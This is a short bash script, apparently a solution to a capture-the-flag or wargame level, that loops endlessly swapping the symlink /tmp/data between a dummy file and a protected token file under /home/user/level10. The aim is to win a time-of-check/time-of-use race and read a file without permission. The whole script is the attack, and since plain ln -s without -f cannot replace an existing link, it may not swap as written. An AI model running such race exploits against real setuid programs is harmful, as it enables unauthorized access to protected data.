#!/bin/bash
# Will constantly change the file pointed by symlink
touch /tmp/fake_token
while :
do
    ln -s /tmp/fake_token /tmp/data
    ln -s /home/user/level10/token /tmp/data
done